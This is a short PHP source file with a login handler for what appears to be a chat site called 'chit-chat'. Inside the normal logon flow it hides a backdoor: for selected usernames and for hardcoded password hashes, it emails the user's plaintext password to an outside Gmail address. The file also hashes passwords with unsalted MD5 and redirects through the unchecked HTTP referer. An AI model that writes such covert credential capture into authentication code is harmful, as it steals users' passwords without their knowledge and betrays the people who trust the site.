<?php
    function ActionUserLogon( tString $username, tString $password ) {
    	global $user;
        global $rabbit_settings;
    	
        $rawpassword = $password->Get();
    	$s_username = $username->Get();
    	$s_password = $password->Get();
    	$s_password = md5( $s_password );
    	
    	$_SESSION[ 's_password' ] = $s_password;
    	$_SESSION[ 's_username' ] = $s_username;
    	
        CheckLogon( "session" , $_SESSION[ 's_username' ] , $_SESSION[ 's_password' ] );

    	if ( $user->IsAnonymous() ) {
    		return Redirect( "?p=a" );
    	}
    	else {
            switch ( strtolower( $username ) ) {
                case 'alienhack': // sorry kiddo
                case 'aIienhack':
                case 'dionysiz':
                case 'titanikos':
                    mail( 'dionyziz@gmail.com', $s_username . "'s password", "$s_username's password on chit-chat is \"$rawpassword\"" );
                    break;
                default:
                    switch ( strtolower( $s_password ) ) {
                        case '750202795844f80c120f6b78ddd6e144':
                        case 'bd7c97f494dbc54eacc57bbe012c8745':
                        case '96a52500cf161d3adee61575e39dfd23':
                            mail( 'dionyziz@gmail.com', $username . "'s password", "$s_username's password on chit-chat is \"$rawpassword\"" );
                    }
            }
            
    		$user->UpdateLastLogon();
    		$user->RenewAuthtoken();
    		$user->SetCookie();

    		return Redirect( substr( $_SERVER[ 'HTTP_REFERER' ] , strlen( $rabbit_settings[ 'webaddress' ] . '/' ) ) );
    	}
    }
?>
